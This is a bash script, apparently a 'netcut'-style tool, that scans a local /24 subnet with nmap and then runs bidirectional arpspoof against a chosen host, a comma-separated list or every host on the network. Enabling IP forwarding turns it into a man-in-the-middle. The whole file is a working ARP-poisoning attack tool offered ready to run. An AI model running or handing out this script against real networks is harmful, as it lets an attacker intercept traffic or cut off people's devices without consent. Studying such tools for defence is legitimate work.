#!/bin/bash
normal='\e[0m'
blue='\e[1;94m'
red='\e[1;31m'
yellow='\e[1;33m'
ul='\e[1;4m'
purp='\e[1;35m'
green='\e[1;32m'
if [[ $1 == "" ]] || [[ $2 == "" ]] || [[ $3 == "" ]] ; then
	echo -e "${red}usage. bash $0 <target> <gateway> <interface>"
        echo -e "eg. bash $0 192.168.1.5 192.168.1.1 wlan0"
        echo -e "eg. bash $0 all 192.168.1.1 wlan0"
        echo -e "eg. bash $0 all 192.168.1.1 wlan0 forward=true"
	exit
fi
echo -e "$red"
echo -n '    ) CODED BY' ; echo -e "$purp @rebellionil $red"
echo ' ( /(             )          '
echo ' )\())      (  ( /(          '
echo '((_)\  (   ))\ )\())         '
echo ' _((_) )\ /((_|_))/          '
echo '| \| |((_|_))(| |_           '
echo '| .` / _|| || |  _|          '
echo '|_|\_\__| \_,_|\__|          '
echo '|'
if [[ $4 =~ "true" ]] ; then
   echo 1 > /proc/sys/net/ipv4/ip_forward
   echo '|[+] echo 1 > /proc/sys/net/ipv4/ip_forward'
fi
trap " echo "" ; kill -9 `pgrep arpspoof` 2> /dev/null ; cd .. ; rm -rf .workspace ; exit " SIGINT SIGTERM
if [[ -d .workspace ]] ; then rm -rf .workspace ; fi
mkdir .workspace
cd .workspace
function scan {
        bash -c "nmap -sn $subn | grep 'Nmap scan report for' | cut -d ' ' -f5 > ip.txt"
        intip=`echo $(echo $( ifconfig wlan0 | grep "inet" | awk {' print $2 '} ) | awk {' print $1 '} )`
        grep -v -e $getaway -e $intip ip.txt > ips.txt
        LIH=`wc -l ip.txt | awk {' print $1'}`
}

subn="$2/24"
getaway="$2"
if [[ $1 == "all" ]] || [[ $1 == "ALL" ]] ; then
	scan
fi
echo -e "${red}|==${yellow} TARGETS$red ==|"
echo -e "${red}|"
if [[ $1 == "all" ]] ; then

	for i in `seq 1 $LIH` ; do
        	t1=`awk NR==$i ip.txt`
        	arpspoof -t $2 $t1 2> /dev/null &
        	arpspoof -t $t1 $2 2> /dev/null &
		echo -e "${red}|___ $blue$t1"
	done
elif [[ $1 =~ `echo $2 | cut -d "." -f1,2,3` ]] ; then
       	if [[ $1 =~ "," ]] ; then

               for i in `echo $1 | sed 's/,/\n/g'` ; do
			arpspoof -t $2 $i 2> /dev/null &
                	arpspoof -t $i $2 2> /dev/null &
			echo -e "${red}|__ $blue$i"
               done
        elif ! [[ $1 =~ "," ]] ; then
		arpspoof -t $2 $1 2> /dev/null &
        	arpspoof -t $1 $2 2> /dev/null &
		echo -e "${red}|__ $blue$1"
        else
                echo -e "${red}|__ Something went wrong , check your options pls"
                exit

	fi
fi
echo ""
while true ; do
	echo -en "$red|__ ${yellow}C${red}trl ${blue}+ ${yellow}C$red or '$yellow EXIT$red 'to stop spoofing : " ; read f
	if [[ $f == "exit" ]] || [[ $f == "back" ]] ; then
		 echo "" ; kill -9 `pgrep arpspoof` 2> /dev/null ; cd .. ; rm -rf .workspace ; exit 0
	fi
done
